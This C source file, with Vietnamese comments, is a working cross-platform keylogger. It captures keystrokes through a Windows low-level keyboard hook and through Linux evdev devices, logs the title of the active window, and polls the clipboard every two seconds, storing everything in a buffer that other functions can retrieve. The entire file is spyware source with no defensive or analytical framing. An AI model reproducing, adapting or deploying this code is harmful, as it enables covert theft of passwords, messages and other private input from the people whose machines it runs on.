/**
 * keylogger.c
 * Keylogger cho Windows (SetWindowsHookEx) va Linux (evdev)
 * Kem theo clipboard monitor
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
    #include <windows.h>
    #include <winuser.h>
#else
    #include <unistd.h>
    #include <fcntl.h>
    #include <linux/input.h>
    #include <dirent.h>
    #include <sys/select.h>
#endif

#include "keylogger.h"

/* Buffer cho keylog */
static char keylog_buffer[65536];
static int keylog_offset = 0;
static char cua_so_hien_tai[256] = "";
static char clipboard_truoc[4096] = "";

#ifdef _WIN32
/* ==================== WINDOWS KEYLOGGER ==================== */

static HHOOK keyboard_hook = NULL;
static int keylogger_dang_chay = 0;

/**
 * Lay ten cua so dang active
 */
static void cap_nhat_cua_so_hien_tai(void) {
    HWND hwnd = GetForegroundWindow();
    if (hwnd != NULL) {
        char window_title[256];
        GetWindowTextA(hwnd, window_title, sizeof(window_title));
        
        if (strcmp(window_title, cua_so_hien_tai) != 0) {
            strncpy(cua_so_hien_tai, window_title, sizeof(cua_so_hien_tai) - 1);
            
            /* Ghi ten cua so vao log */
            time_t now = time(NULL);
            struct tm* tm_info = localtime(&now);
            char time_str[32];
            strftime(time_str, sizeof(time_str), "%H:%M:%S", tm_info);
            
            keylog_offset += snprintf(keylog_buffer + keylog_offset,
                sizeof(keylog_buffer) - keylog_offset,
                "\n[%s] Cua so: %s\n", time_str, cua_so_hien_tai);
            
            if (keylog_offset >= 60000) keylog_offset = 0;
        }
    }
}

/**
 * Chuyen ma phim thanh ky tu
 */
static const char* ma_phim_sang_chuoi(DWORD vk_code) {
    switch (vk_code) {
        case VK_RETURN: return "[ENTER]\n";
        case VK_BACK: return "[BACKSPACE]";
        case VK_TAB: return "[TAB]";
        case VK_SHIFT: return "";
        case VK_CONTROL: return "";
        case VK_MENU: return "";
        case VK_CAPITAL: return "[CAPSLOCK]";
        case VK_ESCAPE: return "[ESC]";
        case VK_SPACE: return " ";
        case VK_LEFT: return "[LEFT]";
        case VK_UP: return "[UP]";
        case VK_RIGHT: return "[RIGHT]";
        case VK_DOWN: return "[DOWN]";
        case VK_DELETE: return "[DELETE]";
        case VK_HOME: return "[HOME]";
        case VK_END: return "[END]";
        case VK_PRIOR: return "[PGUP]";
        case VK_NEXT: return "[PGDN]";
        case VK_INSERT: return "[INSERT]";
        case VK_LWIN: return "[WIN]";
        case VK_RWIN: return "[WIN]";
        case VK_F1: return "[F1]";
        case VK_F2: return "[F2]";
        case VK_F3: return "[F3]";
        case VK_F4: return "[F4]";
        case VK_F5: return "[F5]";
        case VK_F6: return "[F6]";
        case VK_F7: return "[F7]";
        case VK_F8: return "[F8]";
        case VK_F9: return "[F9]";
        case VK_F10: return "[F10]";
        case VK_F11: return "[F11]";
        case VK_F12: return "[F12]";
        default: {
            /* Chuyen virtual key sang ky tu */
            BYTE keyboard_state[256];
            GetKeyboardState(keyboard_state);
            
            WCHAR unicode_char[2];
            int result = ToUnicode(vk_code, 0, keyboard_state, unicode_char, 2, 0);
            
            if (result == 1) {
                char utf8_char[4] = {0};
                WideCharToMultiByte(CP_UTF8, 0, unicode_char, 1, utf8_char, sizeof(utf8_char), NULL, NULL);
                
                static char static_buffer[4];
                strcpy(static_buffer, utf8_char);
                return static_buffer;
            }
            return "";
        }
    }
}

/**
 * Hook callback
 */
static LRESULT CALLBACK keyboard_proc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;
        
        cap_nhat_cua_so_hien_tai();
        
        const char* chuoi = ma_phim_sang_chuoi(kb->vkCode);
        if (strlen(chuoi) > 0) {
            keylog_offset += snprintf(keylog_buffer + keylog_offset,
                sizeof(keylog_buffer) - keylog_offset, "%s", chuoi);
            
            if (keylog_offset >= 60000) {
                keylog_offset = 0;
            }
        }
    }
    
    return CallNextHookEx(keyboard_hook, nCode, wParam, lParam);
}

/**
 * Khoi dong keylogger Windows
 */
int khoi_dong_keylogger(void) {
    if (keylogger_dang_chay) return 0;
    
    keylog_offset = 0;
    memset(keylog_buffer, 0, sizeof(keylog_buffer));
    memset(cua_so_hien_tai, 0, sizeof(cua_so_hien_tai));
    
    keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_proc, 
                                      GetModuleHandle(NULL), 0);
    if (keyboard_hook == NULL) {
        return -1;
    }
    
    keylogger_dang_chay = 1;
    return 0;
}

/**
 * Dung keylogger
 */
int dung_keylogger(void) {
    if (keyboard_hook != NULL) {
        UnhookWindowsHookEx(keyboard_hook);
        keyboard_hook = NULL;
    }
    keylogger_dang_chay = 0;
    return 0;
}

/**
 * Lay du lieu keylog
 */
int lay_keylog(char* ket_qua, size_t ket_qua_size) {
    strncpy(ket_qua, keylog_buffer, ket_qua_size - 1);
    ket_qua[ket_qua_size - 1] = '\0';
    return (int)strlen(ket_qua);
}

/**
 * Xoa buffer keylog
 */
void xoa_keylog(void) {
    keylog_offset = 0;
    memset(keylog_buffer, 0, sizeof(keylog_buffer));
}

/**
 * Monitor clipboard
 */
int kiem_tra_clipboard(char* ket_qua, size_t ket_qua_size) {
    if (!OpenClipboard(NULL)) return -1;
    
    HANDLE clipboard_data = GetClipboardData(CF_TEXT);
    if (clipboard_data == NULL) {
        CloseClipboard();
        return -1;
    }
    
    char* clipboard_text = (char*)GlobalLock(clipboard_data);
    if (clipboard_text == NULL) {
        CloseClipboard();
        return -1;
    }
    
    /* Kiem tra co thay doi khong */
    if (strcmp(clipboard_text, clipboard_truoc) != 0) {
        strncpy(clipboard_truoc, clipboard_text, sizeof(clipboard_truoc) - 1);
        strncpy(ket_qua, clipboard_text, ket_qua_size - 1);
        ket_qua[ket_qua_size - 1] = '\0';
        
        GlobalUnlock(clipboard_data);
        CloseClipboard();
        return 0;
    }
    
    GlobalUnlock(clipboard_data);
    CloseClipboard();
    return -1;
}

/* Message loop cho keylogger */
int chay_message_loop(void) {
    MSG msg;
    while (keylogger_dang_chay) {
        /* Kiem tra clipboard moi 2 giay */
        static time_t last_clipboard_check = 0;
        time_t now = time(NULL);
        if (now - last_clipboard_check >= 2) {
            char clipboard_moi[4096];
            if (kiem_tra_clipboard(clipboard_moi, sizeof(clipboard_moi)) == 0) {
                /* Ghi vao log */
                keylog_offset += snprintf(keylog_buffer + keylog_offset,
                    sizeof(keylog_buffer) - keylog_offset,
                    "\n[CLIPBOARD] %s\n", clipboard_moi);
            }
            last_clipboard_check = now;
        }
        
        /* Xu ly message voi timeout */
        if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        } else {
            Sleep(10);
        }
    }
    return 0;
}

#else
/* ==================== LINUX KEYLOGGER ==================== */

static int keylogger_dang_chay = 0;
static int keyboard_fds[10];
static int so_keyboard = 0;

/**
 * Tim tat ca thiet bi ban phim
 */
static int tim_ban_phim(void) {
    so_keyboard = 0;
    
    DIR* dir = opendir("/dev/input");
    if (dir == NULL) return -1;
    
    struct dirent* entry;
    while ((entry = readdir(dir)) != NULL && so_keyboard < 10) {
        if (strncmp(entry->d_name, "event", 5) == 0) {
            char device_path[64];
            snprintf(device_path, sizeof(device_path), "/dev/input/%s", entry->d_name);
            
            int fd = open(device_path, O_RDONLY | O_NONBLOCK);
            if (fd >= 0) {
                /* Kiem tra xem co phai ban phim khong */
                unsigned long ev_bits = 0;
                ioctl(fd, EVIOCGBIT(0, sizeof(ev_bits)), &ev_bits);
                
                if (ev_bits & (1 << EV_KEY)) {
                    /* Kiem tra co phai keyboard (co phim Q, W, E, R, T, Y) */
                    unsigned long key_bits[8] = {0};
                    ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(key_bits)), key_bits);
                    
                    /* Kiem tra cac phim ban phim co ban */
                    if ((key_bits[KEY_Q / (sizeof(unsigned long) * 8)] >> (KEY_Q % (sizeof(unsigned long) * 8))) & 1) {
                        keyboard_fds[so_keyboard++] = fd;
                        continue;
                    }
                }
                close(fd);
            }
        }
    }
    closedir(dir);
    
    return so_keyboard;
}

/**
 * Chuyen key code sang ky tu
 */
static const char* keycode_sang_chuoi(int code) {
    switch (code) {
        case KEY_ENTER: return "[ENTER]\n";
        case KEY_BACKSPACE: return "[BACKSPACE]";
        case KEY_TAB: return "[TAB]";
        case KEY_SPACE: return " ";
        case KEY_ESC: return "[ESC]";
        case KEY_LEFTSHIFT: case KEY_RIGHTSHIFT: return "";
        case KEY_LEFTCTRL: case KEY_RIGHTCTRL: return "";
        case KEY_LEFTALT: case KEY_RIGHTALT: return "";
        case KEY_CAPSLOCK: return "[CAPS]";
        case KEY_LEFT: return "[LEFT]";
        case KEY_RIGHT: return "[RIGHT]";
        case KEY_UP: return "[UP]";
        case KEY_DOWN: return "[DOWN]";
        case KEY_DELETE: return "[DEL]";
        case KEY_HOME: return "[HOME]";
        case KEY_END: return "[END]";
        case KEY_PAGEUP: return "[PGUP]";
        case KEY_PAGEDOWN: return "[PGDN]";
        case KEY_INSERT: return "[INS]";
        case KEY_F1: return "[F1]"; case KEY_F2: return "[F2]";
        case KEY_F3: return "[F3]"; case KEY_F4: return "[F4]";
        case KEY_F5: return "[F5]"; case KEY_F6: return "[F6]";
        case KEY_F7: return "[F7]"; case KEY_F8: return "[F8]";
        case KEY_F9: return "[F9]"; case KEY_F10: return "[F10]";
        case KEY_F11: return "[F11]"; case KEY_F12: return "[F12]";
        default: {
            /* Map keycode sang ASCII don gian */
            static char buf[2];
            const char* keys = "??1234567890-=\b\tqwertyuiop[]\n?asdfghjkl;'`?\\zxcvbnm,./?*? ????????????????????????????????????????????????????????????????????????????????????????????";
            if (code < (int)strlen(keys)) {
                buf[0] = keys[code];
                buf[1] = '\0';
                return buf;
            }
            return "";
        }
    }
}

/**
 * Khoi dong keylogger Linux
 */
int khoi_dong_keylogger(void) {
    if (keylogger_dang_chay) return 0;
    
    if (tim_ban_phim() <= 0) {
        return -1;
    }
    
    keylog_offset = 0;
    memset(keylog_buffer, 0, sizeof(keylog_buffer));
    keylogger_dang_chay = 1;
    return 0;
}

/**
 * Dung keylogger
 */
int dung_keylogger(void) {
    keylogger_dang_chay = 0;
    for (int i = 0; i < so_keyboard; i++) {
        close(keyboard_fds[i]);
    }
    so_keyboard = 0;
    return 0;
}

/**
 * Doc su kien ban phim
 */
int chay_message_loop(void) {
    fd_set read_fds;
    struct timeval tv;
    
    while (keylogger_dang_chay) {
        FD_ZERO(&read_fds);
        int max_fd = 0;
        
        for (int i = 0; i < so_keyboard; i++) {
            FD_SET(keyboard_fds[i], &read_fds);
            if (keyboard_fds[i] > max_fd) max_fd = keyboard_fds[i];
        }
        
        tv.tv_sec = 0;
        tv.tv_usec = 100000; /* 100ms timeout */
        
        int ret = select(max_fd + 1, &read_fds, NULL, NULL, &tv);
        if (ret <= 0) continue;
        
        for (int i = 0; i < so_keyboard; i++) {
            if (FD_ISSET(keyboard_fds[i], &read_fds)) {
                struct input_event ev;
                ssize_t n = read(keyboard_fds[i], &ev, sizeof(ev));
                
                if (n == sizeof(ev) && ev.type == EV_KEY && ev.value == 1) {
                    const char* chuoi = keycode_sang_chuoi(ev.code);
                    if (strlen(chuoi) > 0) {
                        keylog_offset += snprintf(keylog_buffer + keylog_offset,
                            sizeof(keylog_buffer) - keylog_offset, "%s", chuoi);
                        if (keylog_offset >= 60000) keylog_offset = 0;
                    }
                }
            }
        }
    }
    
    return 0;
}

int lay_keylog(char* ket_qua, size_t ket_qua_size) {
    strncpy(ket_qua, keylog_buffer, ket_qua_size - 1);
    ket_qua[ket_qua_size - 1] = '\0';
    return (int)strlen(ket_qua);
}

void xoa_keylog(void) {
    keylog_offset = 0;
    memset(keylog_buffer, 0, sizeof(keylog_buffer));
}

int kiem_tra_clipboard(char* ket_qua, size_t ket_qua_size) {
    /* Linux clipboard monitor qua xclip */
    FILE* f = popen("xclip -selection clipboard -o 2>/dev/null", "r");
    if (f == NULL) return -1;
    
    char text[4096] = {0};
    fgets(text, sizeof(text), f);
    pclose(f);
    
    if (strlen(text) > 0 && strcmp(text, clipboard_truoc) != 0) {
        strncpy(clipboard_truoc, text, sizeof(clipboard_truoc) - 1);
        strncpy(ket_qua, text, ket_qua_size - 1);
        return 0;
    }
    
    return -1;
}

#endif